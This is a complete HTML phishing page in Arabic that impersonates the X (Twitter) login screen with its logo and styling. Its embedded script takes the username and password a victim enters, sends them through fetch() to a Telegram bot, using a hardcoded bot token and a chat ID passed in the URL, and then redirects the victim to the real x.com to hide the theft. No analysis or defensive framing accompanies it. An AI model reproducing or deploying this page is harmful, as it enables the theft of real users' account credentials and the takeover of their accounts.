<!DOCTYPE html>
<html lang="ar"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>X</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:#15202b;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#192734;padding:20px;border-radius:16px;width:380px;text-align:center;color:#fff}
svg{width:44px;fill:#1d9bf0;margin-bottom:20px}h2{color:#1d9bf0;margin-bottom:15px}
input{width:100%;padding:12px;margin:8px 0;background:#15202b;border:1px solid #38444d;border-radius:4px;color:#fff;font-size:16px}
.btn{background:#1d9bf0;color:#fff;border:none;padding:12px;width:100%;border-radius:30px;font-size:18px;font-weight:bold;cursor:pointer}.btn:hover{background:#1a8cd8}</style></head>
<body><div class="card">
<svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
<h2>تسجيل الدخول إلى X</h2>
<input id="u" placeholder="البريد الإلكتروني أو اسم المستخدم"><br>
<input id="p" type="password" placeholder="كلمة المرور"><br>
<button class="btn" onclick="sendData()">تسجيل الدخول</button>
</div>
<script>
const TOKEN="8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";
const p=new URLSearchParams(location.search);const CHAT_ID=p.get('chat');
function sendData(){const u=document.getElementById('u').value,pa=document.getElementById('p').value;
if(!u||!pa)return alert('املأ جميع الحقول');
fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent('🐦 Twitter/X\n👤 '+u+'\n🔑 '+pa)}`)
.then(()=>{location.href='https://x.com/'})}
</script></body></html>
